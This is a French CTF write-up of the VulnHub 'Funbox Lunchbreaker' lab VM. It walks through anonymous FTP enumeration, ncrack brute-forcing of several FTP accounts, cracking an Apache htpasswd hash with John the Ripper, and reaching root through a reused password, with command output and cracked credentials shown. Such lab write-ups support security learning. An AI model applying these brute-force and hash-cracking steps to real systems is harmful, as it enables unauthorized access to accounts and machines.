---
title: Solution du CTF Funbox Lunchbreaker de VulnHub
tags: [CTF, VulnHub]
---

### Salade tomate oignon

Je continue dans la suite des CTFs Funbox avec le [Lunchbreaker](https://vulnhub.com/entry/funbox-lunchbreaker,700/).

On trouve différents services sur la VM : FTP, SSH et Apache.

Sur ce dernier, juste une image. Dans le code source, beaucoup d'espaces, mais finalement un indice en fin de ligne :

```html
<img src="image.jpg">          --- snip ---       <! webdesign by j.miller [jane@funbox8.ctf] >
```

Le nom d'hôte n'aura aucune importance ici, une énumération des virtual-hosts n'ayant rien remonté.

Sur le FTP, qui accepte les connexions anonymes, on trouve deux fichiers texte ainsi qu'un dossier `wordpress`.

```console
$ ftp anonymous@192.168.56.128
Connected to 192.168.56.128.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
229 Entering Extended Passive Mode (|||26948|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        118          4096 May 22  2021 .
drwxr-xr-x    3 0        118          4096 May 22  2021 ..
-rw-r--r--    1 0        0             233 May 22  2021 .s3cr3t
-rw-r--r--    1 0        0             633 May 22  2021 supers3cr3t
drwxr-xr-x    6 1006     1006         4096 May 22  2021 wordpress
226 Directory send OK.
```

Les fichiers texte n'ont rien d'intéressants. Dans `wordpress/wp-blog` je note la présence d'un fichier `.htaccess` :

```apacheconf
AuthType Basic
AuthName "s3cr3tzone"
AuthUserFile /srv/ftp/wordpress/wp-blog/.htpasswd
Require valid-user
```

Le fichier `.htpasswd` est malheureusement illisible à cause des permissions.

Bien sûr, je récupère la config du Wordpress qui pourrait être utile.

```php
define( 'DB_NAME', 'wpdb' );
define( 'DB_USER', 'wpuser' );
define( 'DB_PASSWORD', 'JuZhRbNNk.()' );
define( 'DB_HOST', '10.10.10.12' );
```

Ça s'arrête malheureusement là, puisque impossible de trouver le Wordpress sur le serveur.

De plus, je n'ai aucun accès en écriture sur le FTP !

### Moi Tarzan

On va donc brute-forcer le seul compte que l'on connait :

```console
$ ncrack -f -u jane -P wordlists/rockyou.txt ftp://192.168.56.128

Starting Ncrack 0.8 ( http://ncrack.org )

Discovered credentials for ftp on 192.168.56.128 21/tcp:
192.168.56.128 21/tcp ftp: 'jane' 'password'

Ncrack done: 1 service scanned in 10.20 seconds.

Ncrack finished.
```

Sur son compte FTP, je trouve un fichier avec des clés, mais aucune idée de leur utilité.

```console
$ cat keys.txt 
kJGgh-kiu65-zghku-76zzt-hgf56
llij8-fgzZ-rTzU1-ddfgz-i876S
```

À mieux regarder le FTP, je peux naviguer dans toute l'arborescence :

```console
$ ftp jane@192.168.56.128
Connected to 192.168.56.128.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||51336|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 22  2021 backups
226 Directory send OK.
ftp> cd /
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||20337|)
150 Here comes the directory listing.
lrwxrwxrwx    1 0        0               7 Feb 01  2021 bin -> usr/bin
drwxr-xr-x    4 0        0            4096 May 22  2021 boot
drwxr-xr-x    2 0        0            4096 May 22  2021 cdrom
drwxr-xr-x   18 0        0            4040 Jul 03 08:00 dev
drwxr-xr-x   98 0        0            4096 May 22  2021 etc
drwxr-xr-x    6 0        0            4096 May 22  2021 home
lrwxrwxrwx    1 0        0               7 Feb 01  2021 lib -> usr/lib
lrwxrwxrwx    1 0        0               9 Feb 01  2021 lib32 -> usr/lib32
lrwxrwxrwx    1 0        0               9 Feb 01  2021 lib64 -> usr/lib64
lrwxrwxrwx    1 0        0              10 Feb 01  2021 libx32 -> usr/libx32
drwx------    2 0        0           16384 May 22  2021 lost+found
drwxr-xr-x    2 0        0            4096 Feb 01  2021 media
drwxr-xr-x    2 0        0            4096 Feb 01  2021 mnt
drwxr-xr-x    2 0        0            4096 Feb 01  2021 opt
dr-xr-xr-x  186 0        0               0 Jul 03 08:00 proc
drwx------    4 0        0            4096 May 22  2021 root
drwxr-xr-x   28 0        0             840 Jul 03 08:37 run
lrwxrwxrwx    1 0        0               8 Feb 01  2021 sbin -> usr/sbin
drwxr-xr-x    6 0        0            4096 Feb 01  2021 snap
drwxr-xr-x    3 0        0            4096 May 22  2021 srv
-rw-------    1 0        0        653262848 May 22  2021 swap.img
dr-xr-xr-x   13 0        0               0 Jul 03 08:00 sys
drwxrwxrwt   12 0        0            4096 Jul 03 08:37 tmp
drwxr-xr-x   14 0        0            4096 Feb 01  2021 usr
drwxr-xr-x   14 0        0            4096 May 22  2021 var
226 Directory send OK.
ftp> ls home
229 Entering Extended Passive Mode (|||36897|)
150 Here comes the directory listing.
dr-x------    3 1002     1002         4096 May 22  2021 jane
dr-x------    3 1001     1001         4096 May 22  2021 jim
dr-x------    4 1000     1000         4096 May 22  2021 john
drwx------    4 1003     1003         4096 May 22  2021 jules
226 Directory send OK.
```

J'ai désormais plus d'utilisateurs. J'ai aussi récupéré la configuration d'Apache, mais il n'est mention de Wordpress nul-part.

### Jules et Jim

Pas grave, je parviens à casser un premier compte :

```
Discovered credentials for ftp on 192.168.56.128 21/tcp:
192.168.56.128 21/tcp ftp: 'jim' '12345'
```

Ce dernier dispose d'un fichier `.ssh/id_rsa` mais il est vide !

Tombe ensuite un second compte :

```
192.168.56.128 21/tcp ftp: 'jules' 'sexylady'
```

Cette fois, je peux obtenir un compte SSH :

```console
jules@funbox8:~$ id
uid=1003(jules) gid=1003(jules) groups=1003(jules)
jules@funbox8:~$ alias ls="ls -alh --color"
jules@funbox8:~$ ls
total 32K
drwx------ 4 jules jules 4.0K May 22  2021 .
drwxr-xr-x 6 root  root  4.0K May 22  2021 ..
drwx------ 2 jules jules 4.0K May 22  2021 .backups
-rw------- 1 jules jules   10 May 22  2021 .bash_history
-rw-r--r-- 1 jules jules  220 May 22  2021 .bash_logout
-rw-r--r-- 1 jules jules 3.7K May 22  2021 .bashrc
drwx------ 2 jules jules 4.0K May 22  2021 .cache
-rw-r--r-- 1 jules jules  807 May 22  2021 .profile
jules@funbox8:~$ ls .backups/
total 134M
drwx------ 2 jules jules 4.0K May 22  2021 .
drwx------ 4 jules jules 4.0K May 22  2021 ..
-r-------- 1 jules jules 134M May 22  2021 .bad-passwds
-r-------- 1 jules jules    0 May 22  2021 .forbidden-passwds
-r-------- 1 jules jules  562 May 22  2021 .good-passwd
-r-------- 1 jules jules    0 May 22  2021 .very-bad-passwds
jules@funbox8:~$ cat .backups/.good-passwd
igsdg457457
dsfg4537
sdfgsdfgsergwser
gwetr4357345
gw53463457
--- snip ---
435z3456u3&&
retjuh5rztu)))
ertzerzt&&&
ertzer!3
```

Je note la présence de wordlists qui serviront sans doute à quelque chose. Et ça tombe bien, car `jules` peut lire le fichier `.htpasswd` croisé au début (merci `LinPEAS`) :

```console
╔══════════╣ Analyzing Htpasswd Files (limit 70)
-r-------- 1 jules jules 43 May 22  2021 /srv/ftp/wordpress/wp-blog/.htpasswd
john:$apr1$2gymw37l$w604wlgyqqNeOgNac.1qT/
```

Contre toute attente, il fallait utiliser la wordlist des mauvais passwords, pas ceux des bons :

```console
$ john --format=md5crypt-long --wordlist=.bad-passwds /tmp/hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
zhnmju!!!        (john)     
1g 0:00:00:00 DONE (2025-07-03 11:47) 33.33g/s 7466p/s 7466c/s 7466C/s zhnmju!!!..victor
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Une fois connecté, une note indique que le mot de passe du super-utilisateur est le même :

```console
john@funbox8:/home/jules$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),30(dip),46(plugdev)
john@funbox8:/home/jules$ cd
john@funbox8:~$ ls -al
total 28
dr-x------ 4 john john 4096 May 22  2021 .
drwxr-xr-x 6 root root 4096 May 22  2021 ..
-rw-r--r-- 1 john john  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 john john 3771 Feb 25  2020 .bashrc
drwx------ 2 john john 4096 May 22  2021 .cache
-rw-r--r-- 1 john john  807 Feb 25  2020 .profile
drwx------ 2 john john 4096 May 22  2021 .todo
john@funbox8:~$ ls .todo/
todo.list
john@funbox8:~$ cat .todo/todo.list 
1. Install LAMP
2. Install MAIL-System
3. Install Firewall
4. Install Plesk
5. Chance R00TPASSWD, because it's the same right now.
john@funbox8:~$ su root
Password: 
root@funbox8:/home/john# cd /root/
root@funbox8:~# ls
root.flag  run.sh  snap
root@funbox8:~# cat root.flag 
|~~          |           |              |    |              |         
|--|   ||/~\ |~~\/~\\/o  | |   ||/~\ /~~|/~\ |~~\|/~\/~//~~||_//~/|/~\
|   \_/||   ||__/\_//\o  |__\_/||   |\__|   ||__/|   \/_\__|| \\/_|   
                                                                    
created by @0815R2d2.

Congrats ! I look forward to see this on my twitter-account :-)
```

